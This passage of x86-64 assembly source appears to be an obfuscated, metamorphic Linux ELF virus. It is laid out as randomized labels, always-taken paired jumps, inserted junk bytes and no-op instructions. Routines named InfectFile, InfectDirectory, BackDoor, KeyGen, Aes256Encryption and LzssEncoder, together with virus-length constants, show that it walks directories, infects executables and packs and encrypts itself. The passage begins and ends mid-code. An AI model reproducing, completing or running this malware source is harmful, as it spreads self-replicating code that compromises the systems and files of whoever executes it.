    jl          IsELFComplete
    jge         IsELFComplete
..@magC6Y9iuFUq:
    mov         BYTE [r1], 0x00
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    call        InfectFile
    jmp         ..@UjYHNYXphJVA
..@C7v8v4ZSQ9Vl:
    xchg        rbx, rbx
    CFILE       DWORD [rsp+_KEYGEN_OFF.fd]
    jmp         $+4
db 0xaa, 0x58
    jmp         $+4
db 0xf6, 0x3e
    jmp         $+5
db 0xb1, 0x66, 0x37
    jmp         ..@MeoZnjHBSo7k
DYNPIEValidation:
    jmp         ..@o8bpr1RdZ68Q
Strcpy:
    jmp         ..@E2suJMaLkztu
..@S0ugjYmmHlj9:
    jle         ..@0Y1FJiNQJXUt
    mov         WORD [rsp+_LZSSE_OFF.match_pos], bx
    je          ..@9dA4ZJFaCcpE
    jne         ..@9dA4ZJFaCcpE
..@fbMS49tgLbjq:
    xor         rcx, rcx
    xor         rbx, rbx
    xchg        rbx, rbx
    js          ..@ax0k3rPbnATo
    jns         ..@ax0k3rPbnATo
..@Loh9FDJIiJUg:
    mov         rax, rax
    jmp         $+3
db 0xac
    jb          ..@2QRZ98PudPJz
    jae         ..@2QRZ98PudPJz
..@9w6NpuvzCm6k:
    mov         r3, r1
    sub         r3, PADDING
    mov         r2, original_virus_len-non_packed_len
    js          ..@UpBzgESU6RKx
    jns         ..@UpBzgESU6RKx
..@fOteVTZudZGc:
    jmp         ..@zG5v34hFby7T
    jmp         $+5
db 0x0b, 0xb3, 0x20
    jmp         $+3
db 0xb9
    jmp         ..@jDrUxz4SeW8g
..@2r2MYoAv542e:
    mov         r2, r5
    call        Strcpy
    mov         BYTE [r1], 0x00
    jmp         $+3
db 0x5c
    jmp         $+5
db 0xca, 0x3f, 0xf7
    jmp         ..@Ka7mPFKKPbdo
..@puz8YL8599el:
    rep         movsb
    jb          ..@ofn0TNsHd4qy
    jae         ..@ofn0TNsHd4qy
..@ROlTtJc7xpAc:
    jnz         ..@jDrUxz4SeW8g
    jb          ..@GbnvrlWtCQBf
    jae         ..@GbnvrlWtCQBf
..@9iNkZlZJL4zj:
    mov         r2, QWORD [r1+file.filesize]
    cmp         rax, r2
    jne         ..@0EjLHg5koSRq
    jmp         $+3
db 0xbe
    jl          ..@T8Pj2yHibNxB
    jge         ..@T8Pj2yHibNxB
..@DVQILdxEqNOt:
    mov         rcx, rcx
    jl          ..@7ZXtBrMHM8zr
    jge         ..@7ZXtBrMHM8zr
..@Ol87BsLfCN9n:
    lea         r3, [rsp+_NBF_OFF.key]
    jl          ..@V7snhnZehQki
    jge         ..@V7snhnZehQki
..@oWpTdc3y6GEF:
    lea         r1, [rsp+_INFFILE_OFF.file]
    call        UnmapFile
    je          ..@R344vax7XaZH
    jne         ..@R344vax7XaZH
..@yuPgpXrahys3:
    push        rcx
    pop         rcx
    jmp         $+5
db 0x8f, 0xf8, 0x8a
    jb          ..@DY6tV45s7m7K
    jae         ..@DY6tV45s7m7K
..@LpiRORGMzTYA:
    sub         r5, 1
    js          ..@BaFzHhvQEha2
    jns         ..@BaFzHhvQEha2
..@uAdNWTJtSDtB:
%ifdef X86_32
    mov         eax, SYS_MMAP2
    int         0x80
    pop         ebp
%endif
    jmp         $+3
db 0x5c
    jmp         $+5
db 0x08, 0x26, 0xde
    jmp         ..@jCXsKXNMusu1
..@cCMR1ddUQIxm:
    cmp         eax, 0x3
    jmp         $+4
db 0x18, 0xc7
    jl          ..@hZJb7OggblMZ
    jge         ..@hZJb7OggblMZ
..@KkUFpYZowhZd:
    mov         r1, QWORD [rsp+_INFFILE_OFF.file+file.fileptr]
    jmp         $+4
db 0x0f, 0xdc
    jb          ..@Q46q0xZRuPqV
    jae         ..@Q46q0xZRuPqV
..@T6cE3V69osrT:
    push        rcx
    pop         rcx
    jmp         $+4
db 0x55, 0xcc
    jmp         $+3
db 0x05
    jmp         ..@vXeIJmwdBBJa
..@9SHKbYuh86np:
    jmp         Strcpy
    jmp         $+4
db 0x45, 0x60
    jmp         ..@oA0bAOQdrMuB
..@iTHwWS4VrDKP:
    mov         rcx, rcx
    jl          ..@UZGPe6rCivAD
    jge         ..@UZGPe6rCivAD
..@KkIMuXcrtfQm:
    add         r1, r4
    cmp         BYTE [r1], 0x00
    jmp         $+5
db 0xe4, 0x76, 0x9c
    jmp         $+5
db 0xb7, 0x40, 0x15
    jmp         $+4
db 0xfe, 0xc4
    jmp         ..@veula7Jocueh
..@xE16XxBlPdQT:
    ret
    jmp         $+3
db 0xb8
    jmp         KeyGen
..@sACOze0guIjG:
    mov         r2, QWORD [r5+file.fileptr]
    push        rdx
    jmp         ..@lMLvZj3BcoZL
..@3n6j4Wnn5Wt7:
    je          ..@zsINgtGROFAC
    jmp         $+4
db 0x8f, 0xe5
    jmp         ..@3avhhAMU6qDo
..@oFXsYFzK9xSM:
    ret
    jmp         $+5
db 0x35, 0x23, 0x3e
    js          ..@Lk619ECM6sVT
    jns         ..@Lk619ECM6sVT
..@1tOE1jzJiv4Y:
    cmp         dl, BYTE [rsp+_LZSSE_OFF.match_len]
    jb          ..@S0ugjYmmHlj9
    jae         ..@S0ugjYmmHlj9
..@NcdO0Pxql9Cv:
    je          ..@zdJ6jwZ7XATV
    jmp         $+5
db 0x55, 0x4f, 0x2b
    jl          ..@iUjz4NpprUdL
    jge         ..@iUjz4NpprUdL
..@4K53GzjjFAdN:
    mov         rdi, rdi
    aesenc      xmm0, xmm1
    jmp         $+3
db 0x32
    jmp         $+3
db 0x0e
    jmp         ..@7G4ZRwnxqGCg
..@MHBZefK9Zp2I:
    add         rdi, rax
    js          ..@wUFDh5b2DFmV
    jns         ..@wUFDh5b2DFmV
..@hHuWxktkLiSd:
    push        r1
    xor         rdi, rdi
    xor         rcx, rcx
    jmp         ..@rqtaTSyuGdaz
..@aT8BpEUvicRa:
    xor         rax, rax
    xor         r2, r2
    mov         r1, m6
    jmp         ..@AHTBKrw9azKx
..@oppwM1q9hr8c:
    xchg        rsp, rsp
    jmp         ..@jLxPxNLLqRYA
..@NcfV489FkQFK:
    add         rsi, WINDOW_LENGTH
    rep         movsb
    jmp         $+5
db 0x02, 0xbf, 0xa0
    js          ..@1LRdNm4IWYfI
    jns         ..@1LRdNm4IWYfI
..@3PXY7qbh9z3Q:
%ifdef X86_32
    push        ebp
    xor         ebp, ebp
%endif
    jmp         $+4
db 0x1b, 0xb4
    jmp         $+3
db 0x85
    jb          ..@uAdNWTJtSDtB
    jae         ..@uAdNWTJtSDtB
..@LJkzYsdfUEmf:
    xor         r2, r2
    jb          ..@rUIeUkGCX0e7
    jae         ..@rUIeUkGCX0e7
..@waHKhoFIHxrw:
    push        rax
    jmp         $+4
db 0x7c, 0x86
    jmp         ..@nbokKBOGjfaO
..@n8ZPYy9nfUsh:
    inc         WORD m5
    jmp         $+5
db 0xd7, 0xc7, 0xf9
    js          ..@Wje5R5pbCfW0
    jns         ..@Wje5R5pbCfW0
..@5Dp4ThyiM9ar:
    je          ..@xSh40Y0kVmwL
    jmp         $+3
db 0xe4
    jmp         $+3
db 0xe8
    jmp         $+3
db 0xa6
    jmp         ..@aJQSAAdgSRmI
..@nMOyjXjDdZyK:
    mov         r2, signature_len
    jb          ..@NXy4ygkIeBoB
    jae         ..@NXy4ygkIeBoB
..@HOXbvCBkbI80:
%ifndef ENABLE_DEBUGGING
    mov         rbp, rbp
%endif
    jmp         $+3
db 0xa1
    jmp         $+3
db 0x20
    jmp         $+5
db 0x7a, 0xbf, 0x42
    jl          ..@2UzF1BkwcxD6
    jge         ..@2UzF1BkwcxD6
..@f4FyH8PxVwSx:
    mov         rax, rax
    mov         rbp, rbp
    jmp         $+5
db 0x4d, 0xac, 0x09
    jmp         $+5
db 0xd7, 0x75, 0x97
    jb          ..@5M6zxzXxqyup
    jae         ..@5M6zxzXxqyup
..@yL5ZvFG8sxFY:
    mov         r1, r5
    jmp         $+3
db 0x53
    jmp         $+4
db 0xa4, 0x13
    jmp         ..@KkIMuXcrtfQm
..@F92VNhWKybFz:
    mov         BYTE [rsp+_LZSSE_OFF.bits], 0x00
    mov         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    inc         QWORD [rsp+_LZSSE_OFF.outputaddr] 
    js          ..@duECsJg4uPYy
    jns         ..@duECsJg4uPYy
..@quDXqCtxsEfP:
    jmp         ..@BuzxMPol5Jk7
    jmp         $+3
db 0x5c
    js          ..@0EjLHg5koSRq
    jns         ..@0EjLHg5koSRq
..@7HqweaW0L8hE:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    sub         ax, WORD [rsp+_LZSSE_OFF.la_index]
    mov         edx, LOOKAHEAD_LENGTH
    jmp         $+4
db 0x61, 0xf9
    jmp         $+5
db 0x73, 0x8c, 0x3b
    je          ..@7Z7caBPjOsfZ
    jne         ..@7Z7caBPjOsfZ
..@49214h1kuf6v:
    call        InfectDirectory
    jmp         ..@GjERNERShRqe
..@TBtLPNBr5j6Q:
    movzx       rax, BYTE [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_reclen+r4]
    add         QWORD [rsp+_INFDIR_OFF.dirindex], rax
    add         r4, rax
    jmp         $+4
db 0xba, 0xd1
    jl          ..@GbFvti5VxtQ2
    jge         ..@GbFvti5VxtQ2
..@69MRjvR02oeR:
    mov         WORD [rsp+_UPDATASIG_OFF.index], r2w
    jmp         $+3
db 0x3e
    jb          ..@RZpdd0dPm7R8
    jae         ..@RZpdd0dPm7R8
..@hq9dxzlSmG8k:
    sub         rsp, _INFDIR_OFF_size
    mov         rdi, rdi
    jmp         $+3
db 0xaa
    jmp         $+5
db 0xf3, 0x1b, 0xe3
    jb          ..@ZI67OVKEc35v
    jae         ..@ZI67OVKEc35v
..@GCU9OnfcHomQ:
    ret
    je          LzssEncoder
    jne         LzssEncoder
..@YdZmkBzTno5f:
    test        rax, rax
    jl          ..@NwHF7oj2MMWi
    jge         ..@NwHF7oj2MMWi
..@jjVCKl9L01cq:
    and         ax, 1111b
    je          ..@PspvTobNv2o6
    jne         ..@PspvTobNv2o6
..@SphEzlaUXEnl:
    add         rsp, _DYNPIE_OFF_size
    jmp         ..@2jYnQovqbc5Z
..@Rt9yFJh3MAIN:
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0x20]
    aesenc      xmm0, xmm1
    jmp         $+3
db 0x74
    jmp         $+4
db 0x80, 0xee
    jb          ..@mLnijcBzMXLT
    jae         ..@mLnijcBzMXLT
..@WK2Wc8y5Kcxn:
    mov         r1, QWORD [r5+file.fileptr]
    jmp         $+4
db 0x89, 0xf9
    jmp         ..@wtr81vGkEaSJ
..@UUmCW3VooHAy:
    push        rsi
    jl          ..@OSwFS8lWN7ck
    jge         ..@OSwFS8lWN7ck
..@nEDZl8IwQ1EJ:
    mov         r1, rax
    xor         r2, r2
    jmp         $+3
db 0xf2
    jmp         ..@KbV9RWJEkWmT
..@hdtrMyD3mXvl:
    syscall
    jmp         $+4
db 0xf5, 0xb2
    jmp         $+3
db 0xfb
    js          ..@DKjItfNSlnyh
    jns         ..@DKjItfNSlnyh
..@PJOg2WvmHTBi:
    cmp         rax, 0x00
    jmp         ..@7X47Fo4qdbAg
..@ax0k3rPbnATo:
    xor         rdx, rdx
    mov         bl, BYTE [rsp+_LZSSE_OFF.character]
    push        rdx
    js          ..@ZEZxcxSFYmgb
    jns         ..@ZEZxcxSFYmgb
..@JPTpBWuEX59S:
%ifndef ENABLE_DEBUGGING
    push        rsi
%endif
    jmp         $+5
db 0x96, 0x3c, 0x57
    jmp         ..@OMpy3N5bM7IJ
..@mlaOSeOO0ijz:
    mov         DWORD [rsp+_PROC_OFF.filefd], eax
    jmp         $+5
db 0x2a, 0x8e, 0x4b
    jmp         ..@drXM5fV3s4dB
..@BWM4BQxPABoV:
    mov         rbx, rbx
    push        rax
    pop         rax
    jmp         ..@NGx5fmjWzAlS
..@Aah2IeUfeSHv:
    xor         rcx, rcx
    xor         rbx, rbx
    jmp         $+5
db 0x98, 0xcc, 0x0a
    js          ..@7COWA3gSoOwC
    jns         ..@7COWA3gSoOwC
..@Anbhud6cV7Zi:
    xchg        rcx, rcx
    jmp         $+4
db 0xdc, 0x57
    jl          ..@EMBNqq9zFm10
    jge         ..@EMBNqq9zFm10
..@BhAMqS0Ud1U6:
    pop         rsi
    mov         rbx, rbx
    mov         [rsp+_LZSSE_OFF.inputaddr], rsi
    jmp         $+4
db 0xc5, 0x54
    je          ..@TglUL4c2hHAB
    jne         ..@TglUL4c2hHAB
..@QtNMTbJ6VVJO:
    test        edx, edx
    push        rbx
    pop         rbx
    jmp         $+4
db 0x2d, 0x35
    jmp         ..@pzQhMyfepJgS
..@SRUBfQZF7aKR:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    add         rdi, rax
    xor         rax, rax
    jmp         $+4
db 0x4c, 0x48
    jmp         $+4
db 0x6c, 0x3e
    jl          ..@vYQYTVyNQHTB
    jge         ..@vYQYTVyNQHTB
..@s9NJdMEVrjUS:
    pop         rax
    add         r5, QWORD [r4+rax+p_h.p_memsz]
    cmp         r5, QWORD [rsp+_VADDR_OFF.tmp_vaddr]
    jl          ..@ZviDWGajGJyE
    jge         ..@ZviDWGajGJyE
..@HbNrfnjit5E5:
    jle         ..@roUJuZp2q12b
    mov         QWORD [rsp+_PROC_OFF.dirnread], rax
    jmp         $+5
db 0xda, 0x6a, 0x3b
    jb          ..@ObPTNJFa0zqD
    jae         ..@ObPTNJFa0zqD
..@LrXR0HNbPrmd:
    test        r2, r2
    jnz         ..@Y61Jt6wG3DVA
    js          ..@eUIPJhexYDrE
    jns         ..@eUIPJhexYDrE
..@ieHsrPUAbtrM:
    mov         QWORD [rsp+_LZSSE_OFF.inputaddr], r1
    jmp         $+5
db 0xdb, 0xc0, 0xf0
    jmp         ..@oSwOZ9iFly5c
..@QKi2kxxr9KMH:
    and         WORD [rsp+_LZSSE_OFF.match_pos], WINDOW_LENGTH-1
    jl          ..@N0kBOgNiDcdu
    jge         ..@N0kBOgNiDcdu
..@bnJAfMneWcK9:
    xor         rax, rax
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    sub         rcx, rax
    jb          ..@hKj6kwqwEsc2
    jae         ..@hKj6kwqwEsc2
..@CsBEQUtHXipa:
%ifndef ENABLE_DEBUGGING
    call_vsp    ExitProgram
%endif
    jmp         $+4
db 0xcd, 0x91
    jmp         $+4
db 0x29, 0x98
    jmp         $+5
db 0x4b, 0xc4, 0x4e
    jmp         ..@VvXqfiDvOTNJ
..@VLWCXrRvByfq:
%ifndef ENABLE_DEBUGGING
    mov         r1, 0xf
%endif
    jmp         $+3
db 0x88
    jmp         ..@FbAo2fTCYm54
..@EW9C9zZrjl6w:
    jl          ..@PJMOYsxu6N9D
    jmp         $+5
db 0x09, 0x20, 0x93
    jmp         $+5
db 0x98, 0x1e, 0xed
    js          ..@yRO3HVWisvS0
    jns         ..@yRO3HVWisvS0
..@tMHbGqTMJAmH:
    mov         r1, rax
    mov         r2, vsp
    js          ..@YqAyuxKpZI5m
    jns         ..@YqAyuxKpZI5m
..@vT4DVSJ9I1Am:
    mov         ax, WORD [r1]
    mov         WORD [rsp+_DYNPIE_OFF.shnum], r1w
    js          ..@oQBPdSay0HAk
    jns         ..@oQBPdSay0HAk
..@FbAo2fTCYm54:
%ifndef ENABLE_DEBUGGING
    VAR         packed, bash
%endif
    jmp         ..@51DxuIDNcjZ7
..@o8SS0ihquqU1:
    pop         r3
    jmp         $+5
db 0xc1, 0xb8, 0x86
    jmp         $+3
db 0x0f
    jmp         ..@2ql7KcyziHQ3
..@ByVnd6xn0EDv:
    add         r2, e_h.e_shoff
    jmp         ..@ePaSlgvZIKMB
..@2QRZ98PudPJz:
    ret
    js          Strcpy
    jns         Strcpy
..@V7snhnZehQki:
    call        Aes256Encryption
    je          ..@MyRYWtpvcv0l
    jne         ..@MyRYWtpvcv0l
..@BuzxMPol5Jk7:
    pop         r2
    jmp         ..@DuhBNXSWRPTm
..@p31E2w4ylP4R:
    call        WORDToDWORDASCII
    jmp         $+4
db 0x00, 0x01
    jmp         $+5
db 0x39, 0x84, 0x69
    jmp         $+4
db 0xc5, 0xb0
    jmp         $+4
db 0x98, 0x95
    jmp         ..@XO3TKdF79duJ
..@Y5CmDZ8HvmSu:
    mov         rdx, rdx
    jmp         ..@ggv6Mgjsjveu
..@oQBPdSay0HAk:
    mov         r1, QWORD [rsp+_DYNPIE_OFF.ptr]
    mov         rdi, rdi
    jmp         ..@E1TDWBfRehdA
..@uHZ4Bg6Kstri:
%ifdef X86_64
    mov         r10d, 0x01
%endif
    jmp         $+5
db 0xe6, 0x70, 0x72
    jmp         ..@1i49D25UuIHV
..@T3w2SyuWBtoG:
    xor         r1, r1
    mov         r1w, WORD [rsp+_UPDATASIG_OFF.keyprev]
    jmp         $+4
db 0x3f, 0x2a
    jmp         $+4
db 0xf2, 0xa9
    jl          ..@wpcxqtxe0hqq
    jge         ..@wpcxqtxe0hqq
..@F353zxsNQXuw:
    lea         r2, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    jmp         $+3
db 0x93
    jmp         ..@cL6oyHFkod0G
BackDoor:
    jmp         ..@aUMorvRkNRGu
..@dGXI3zRSDFvD:
    test        eax, eax
    jmp         $+3
db 0xc7
    je          ..@mPFbagIRVA4X
    jne         ..@mPFbagIRVA4X
..@YJq8sH3pI3QP:
%ifdef X86_32
    mov         ecx, r3
    xchg        rdi, rdi
%endif
    jb          ..@5Dp4ThyiM9ar
    jae         ..@5Dp4ThyiM9ar
..@C9nxA7KHO9B0:
    push        rcx
    jmp         ..@jhy3ngHuDNWn
..@OIJN5ndBhstV:
    mov         rsp, rsp
    mov         rsi, rsi
    jnz         ..@jUXC8eXOk8fw
    jmp         $+3
db 0x83
    js          ..@RL4btznYZWao
    jns         ..@RL4btznYZWao
..@DjYjPZRgj3T4:
    mov         rax, r2
    je          ..@aZlrRNYe76LU
    jne         ..@aZlrRNYe76LU
..@RcGF08FzDU3D:
    mov         r1, m6
    jmp         $+3
db 0x01
    jmp         ..@63mxLdFS9t7W
..@gNZVU9t9ubvZ:
    mov         r2, QWORD [rsp+_INFDIR_OFF.dirname]
    call        Strcpy
    jb          ..@2qRw1RasC4Rr
    jae         ..@2qRw1RasC4Rr
..@cXlpNhORfiRR:
    mov         al, BYTE [rsp+_LZSSE_OFF.bits]
    mov         rdi, QWORD [rsp+_LZSSE_OFF.outputaddr]
    mov         BYTE [rdi], al
    jb          ..@If5h7FC06SaU
    jae         ..@If5h7FC06SaU
..@oA0bAOQdrMuB:
    mov         rcx, rcx
    jb          ..@AePV1v98LOQu
    jae         ..@AePV1v98LOQu
..@e8GfG099MPkc:
    call        MemMove
    js          ..@FBwWJjnrXvqR
    jns         ..@FBwWJjnrXvqR
..@et3Gu69QRuZ2:
    pop         rbx
    je          ..@k3HMe9vCmxYf
    jne         ..@k3HMe9vCmxYf
..@Ka7mPFKKPbdo:
    mov         rdx, rdx
    mov         rbp, rbp
    jmp         ..@ux4yz4cJej61
..@1MfVbZBJ9tkB:
    cmp         BYTE [r5], DT_REG
    jb          ..@ihaY7TS8p7cQ
    jae         ..@ihaY7TS8p7cQ
..@y4uAeX2RFkyj:
    mov         rcx, rcx
    jmp         $+3
db 0xdc
    jmp         ..@JWcDmXpxNIFY
..@ENQl3DJZ8rPl:
%ifndef ENABLE_DEBUGGING
    mov         r1, rax
%endif
    jmp         $+5
db 0x62, 0x1a, 0x1d
    je          ..@4WFpHhyT5MD6
    jne         ..@4WFpHhyT5MD6
..@KwJGr0GOf6Jr:
%ifndef ENABLE_DEBUGGING
    pop         rbx
    cmp         al, 0x0
%endif
    jl          ..@u4wuOgws8HxO
    jge         ..@u4wuOgws8HxO
..@lHwVNaoh9Hqa:
    syscall
    jb          ..@l8nTeZwFbKHf
    jae         ..@l8nTeZwFbKHf
..@zTVUtqWPHMjD:
    mov         BYTE [r1], 0x00
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    jmp         ..@D4uN6bTlUFui
..@rqtaTSyuGdaz:
    xor         rdx, rdx
    jmp         $+3
db 0x74
    jmp         ..@88O29IAoX2IU
..@SVG2CQYnOsIX:
    mov         QWORD [rsp+_INFDIR_OFF.dirnread], rax
    js          ..@DPLx9rmXwSlc
    jns         ..@DPLx9rmXwSlc
..@cL6oyHFkod0G:
    mov         rax, rax
    jmp         $+3
db 0x83
    jb          ..@UBofSKnhLrkL
    jae         ..@UBofSKnhLrkL
..@mmaIxPWflqsu:
    mov         r1, QWORD [r5+file.filename]
    cmp         BYTE [r1], '/'
    jne         ..@Y61Jt6wG3DVA
    jl          ..@jGK2LSf7CFO7
    jge         ..@jGK2LSf7CFO7
..@ggv6Mgjsjveu:
    shr         dx, 0x4
    js          ..@SkBMUeGTieSE
    jns         ..@SkBMUeGTieSE
..@VmfTOQbYua55:
    and         r4, 10b
    jmp         ..@YD6gyYjX26yt
..@plWkzPzTLSo7:
    pop         rax
    cmp         rax, 0x0
    jmp         $+3
db 0xcb
    jmp         ..@eBtfz4C8joqG
..@aBCV9tGXDRWw:
    mov         rax, r4
    movzx       r3, WORD [r1+e_h.e_phentsize]
    mul         r3
    jmp         ..@aGpmDNtnY6Ig
..@5M6zxzXxqyup:
    add         r1, 1
    js          ..@NUfZW7RCBeAT
    jns         ..@NUfZW7RCBeAT
..@5TcS0uFa1aKo:
    call        MapFile
    cmp         rax, 0
    jne         ..@hWWPCzhBrzWY
    jmp         $+4
db 0xc3, 0xfe
    jmp         $+3
db 0xc5
    jmp         $+4
db 0x2b, 0x38
    jmp         $+5
db 0x06, 0xc4, 0xb9
    je          ..@S7L6vbg5uyin
    jne         ..@S7L6vbg5uyin
..@WELLzgULDgrM:
    pop         r5
    jmp         $+4
db 0xd3, 0x47
    jmp         $+4
db 0xc3, 0x99
    je          ..@mdNNrrrWy3ef
    jne         ..@mdNNrrrWy3ef
..@giJsYCps22rF:
    push        rdi
    jmp         ..@Uf7hLHzA0Pob
..@TnfyO5uGF7cD:
    mov         rsi, rsi
    GGLOBAL     _signature
    mov         r1, r5
    jmp         $+3
db 0xd9
    jmp         ..@lcrduYrduDXT
..@AGwGHTilh26h:
    ret
    js          GetNewProgramVaddr
    jns         GetNewProgramVaddr
..@I1iAdfotuM5f:
    rep         movsb
    jmp         $+3
db 0x43
    jmp         ..@3yUhr3J7X92P
..@j8GUhtJcaoEo:
    cld
    jmp         ..@OehkXiEh7Zty
..@Itt6ww4zfBuO:
    mov         r1, QWORD [r5+file.filesize]
    cmp         r1, e_h_size
    jmp         $+5
db 0xcb, 0xb6, 0xbf
    je          ..@CiLQife0WV4S
    jne         ..@CiLQife0WV4S
..@3avhhAMU6qDo:
    push        rax
    pop         rax
    cmp         QWORD m7, 0x00
    jl          ..@nwaaPRiREmAH
    jge         ..@nwaaPRiREmAH
..@a8UDGpkenpRE:
    xchg        rsi, rsi
    jl          ..@grZwhXU8SqPr
    jge         ..@grZwhXU8SqPr
..@1i49D25UuIHV:
%ifdef X86_64
    push        rbx
    pop         rbx
%endif
    jmp         $+5
db 0xab, 0x8b, 0xa9
    jmp         ..@Y27DPo2J3ZLF
..@sAGQRLC3STig:
    add         r1, non_packed_len+PADDING
    mov         r2, m8
    js          ..@RqnlDVNQgIwx
    jns         ..@RqnlDVNQgIwx
..@R21xB5SfPdoE:
    jmp         ..@9S07vIcmOYxz
    jmp         $+5
db 0xc6, 0x47, 0x1b
    js          ..@eQguYNCgXvyu
    jns         ..@eQguYNCgXvyu
..@xjVdGcQvMv1V:
    sub         rdi, 1
    jmp         $+5
db 0x06, 0xe5, 0x84
    js          ..@AQLDtC5oSwQv
    jns         ..@AQLDtC5oSwQv
..@EGLKqejjC9Hg:
    mov         rsi, rsi
    jmp         $+5
db 0xb8, 0x85, 0xec
    jb          ..@eD12VSBe3hJ8
    jae         ..@eD12VSBe3hJ8
..@YMc3NFB3F8vj:
    mov         r1d, eax
    mov         r2, QWORD [rsp+_KEYGEN_OFF.bufferaddr]
    je          ..@QlZxJM2ioibR
    jne         ..@QlZxJM2ioibR
..@rbmZCC2QNnsB:
    jnz         ..@7Wf05n5s5ayh
    jmp         ..@ZGKhzXTEjP5f
..@Gk0BmP6bBfD6:
    jmp         ..@ZGwvYCTe1Wa9
    jmp         ..@gdbsc0fWsixU
..@8eOQ7X6C4AHH:
    xor         r4, r4
    mov         rax, rax
    VAR         packed, procs
    jb          ..@yL5ZvFG8sxFY
    jae         ..@yL5ZvFG8sxFY
..@AY7rgoLJ3br0:
    jge         ..@zsINgtGROFAC
    jmp         $+3
db 0xb8
    je          ..@Q1LJGUBTCUWH
    jne         ..@Q1LJGUBTCUWH
..@tOReMYymuVB9:
    mov         r1, QWORD [r5+file.fileptr]
    je          ..@Qx7mTrQMFsya
    jne         ..@Qx7mTrQMFsya
..@5KAswpxIPdzm:
    mov         cl, BYTE [rsp+_LZSSE_OFF.cmp_len]
    jl          ..@0wTskHBhFQpR
    jge         ..@0wTskHBhFQpR
..@6WgSwWLdvxZc:
    je          ..@ViC3FLdVF0dH
    jmp         ..@DjYjPZRgj3T4
    mov         rsi, rsi
    jmp         $+5
db 0x67, 0xfa, 0xb2
    jmp         $+3
db 0xaa
    jl          ..@ViC3FLdVF0dH
    jge         ..@ViC3FLdVF0dH
..@aZZClK3Fmx7M:
    movdqu      xmm1, oWORD [rsp+0x60]
    jmp         $+4
db 0xd6, 0x2b
    jl          ..@7KiaLnnvzyui
    jge         ..@7KiaLnnvzyui
..@FeBuXSiburkB:
%ifdef X86_32
    mov         rsp, rsp
    mov         edi, r1
    mov         esi, r2
%endif
    jmp         $+4
db 0x45, 0x17
    jl          ..@YJq8sH3pI3QP
    jge         ..@YJq8sH3pI3QP
..@Mkxe0L3EtCg2:
    xor         r3, r3
    jmp         ..@THLXWDeMSVKL
..@PspvTobNv2o6:
    cmp         al, 0xa
    jl          ..@Ahe3hQ9T78At
    jmp         ..@ohzhl1TUkyf2
..@IlnOA7Jyr0DY:
    add         rdi, virus_len-_start
    jmp         $+3
db 0x40
    jmp         $+4
db 0xc1, 0x6e
    jmp         $+4
db 0x50, 0x74
    jmp         ..@5FM6NXtPceaR
..@0WBXGIc6DeBw:
%ifndef ENABLE_DEBUGGING
    push        rbx
    pop         rbx
    xchg        rdi, rdi
%endif
    jmp         $+4
db 0xfe, 0x67
    jmp         ..@KKTOCrBANMgb
..@NKD1joOnFyDE:
    mov         r2, QWORD [r1+e_h.e_phoff]
    mov         rsp, rsp
    mov         rcx, rcx
    jmp         $+4
db 0x98, 0x4b
    jb          ..@sSos37gTEzX7
    jae         ..@sSos37gTEzX7
..@ZI67OVKEc35v:
    mov         BYTE [rsp+_INFDIR_OFF.depth], r2b
    jmp         ..@VNnBbqTGebub
..@osysrPRlQxOq:
    mov         r1, m6
    add         r1, non_packed_len+PADDING
    jmp         $+3
db 0x18
    jl          ..@9w6NpuvzCm6k
    jge         ..@9w6NpuvzCm6k
..@tizWunfvQhax:
    call        MemMove
    mov         rcx, signature_len
    mov         rdi, QWORD [r5+file.fileptr]
    jb          ..@lzI8nYE6WX05
    jae         ..@lzI8nYE6WX05
..@5IqUQ1cAWg2Y:
    cmp         WORD [r1], '..'
    jl          ..@fInPLVelfVIM
    jge         ..@fInPLVelfVIM
..@WwTGrYawrHXA:
    movdqu      xmm1, oWORD [rsp+0x80]
    jmp         ..@4K53GzjjFAdN
..@zB9AamMqINSG:
    jne         ..@amJk22FETKlb
    jmp         ..@tvSfFGmnQeCE
..@VNnBbqTGebub:
    mov         QWORD [rsp+_INFDIR_OFF.dirname], r1
    jmp         ..@ad1Mt94SS9Zo
..@MeoZnjHBSo7k:
    add         rsp, _KEYGEN_OFF_size
    pop         r3
    pop         r2
    jmp         $+4
db 0xeb, 0x15
    jl          ..@LgVknzVAdKhO
    jge         ..@LgVknzVAdKhO
..@Yxls3RklPOOV:
    mov         rdi, rdi
    jmp         $+3
db 0x5e
    jmp         $+3
db 0xb9
    js          ..@fbMS49tgLbjq
    jns         ..@fbMS49tgLbjq
..@JyhKSB8BSJj5:
    mov         rsi, rsi
    push        rsi
    js          ..@crD0ydGEznVa
    jns         ..@crD0ydGEznVa
..@7ZXtBrMHM8zr:
    add         rsp, _NBF_OFF_size
    jmp         ..@nGfdb3UgazZj
..@rysDpqCqwug0:
    mov         rsi, rsi
    jmp         ..@5V0QzROoPGzC
..@DgZ3ibeHRW29:
    add         rsp, _PROC_OFF_size
    jmp         $+5
db 0xab, 0x02, 0xea
    jmp         $+4
db 0xfb, 0x38
    jmp         ..@vWuaAj6NNfO3
..@142GWEyEpr3C:
    je          ..@C2blMqPGPlM1
    jmp         $+5
db 0xe1, 0x70, 0x3b
    jmp         $+3
db 0x66
    jmp         ..@nEDZl8IwQ1EJ
..@TgoJtM7vs9Nz:
    xor         rdx, rdx
    jmp         ..@IyxnsZwMEkf5
..@0KWWpYxDdPIr:
    mov         r1, QWORD [r5+file.fileptr]
    cmp         DWORD [r1], 0x464c457f
    jmp         $+5
db 0x1d, 0x9d, 0x55
    jmp         $+3
db 0xdd
    jmp         ..@03CoQuLOCptz
..@Wd5zvoYbqiph:
    add         QWORD [rsp+_PROC_OFF.dirindex], rax
    mov         rbx, rbx
    add         r4, rax
    jmp         $+4
db 0xa6, 0x25
    jmp         ..@LWLpHKBFS66Y
AddSizeMappedFile:
    jmp         ..@ZK0eVJkQAswv
..@VF3poQ6EvKH7:
    mov         rsi, rsi
    jl          ..@knv6fBdqYynh
    jge         ..@knv6fBdqYynh
..@ULTYepOxPYGG:
    pop         rsi
    xor         rax, rax
    jmp         ..@7ibetLnsTsG8
    jmp         ..@E1AOSFe0dB0u
..@xXDAyh4CamfQ:
